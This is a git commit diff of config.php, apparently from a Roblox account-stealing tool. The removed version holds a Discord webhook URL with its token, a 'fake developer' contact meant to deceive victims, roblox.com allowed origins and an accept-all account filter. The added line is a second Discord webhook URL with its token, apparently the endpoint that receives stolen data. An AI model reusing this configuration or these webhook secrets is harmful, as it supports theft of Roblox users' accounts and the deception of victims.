d07615ce077c1a17ca46bf95469aaf610b7244f1
cashh2k <90965770+cashh2k@users.noreply.github.com>
2021-09-18 04:28:28 -0700

    Update config.php

--- config.php
+++ config.php
@@ -1,14 +1,1 @@
-<?php
-    // webhook link
-    $webhook = "https://discord.com/api/webhooks/781306315725078538/92kXwcI2kO0C5LumuoVGTTyZTKeVC3-gjDSf02_hfy-OL3qGaXyXeWMrECrm3v-o8fy0";
-    // fake developer for the bot the users may contact
-    $discord_contact = "TeeScrap#1474";
-    
-    $allowed_origins = array(
-        "https://www.roblox.com",
-        "https://web.roblox.com"
-    );
-    function account_filter($profile) {
-        return true;
-    }
-?>
+https://discordapp.com/api/webhooks/888747184340754444/kMGdf9RjwY2yYPQCz3fhqf4P8mokyCT6qpAs5Sies696HdnKdSfToovGmQSSRLjh8KVE
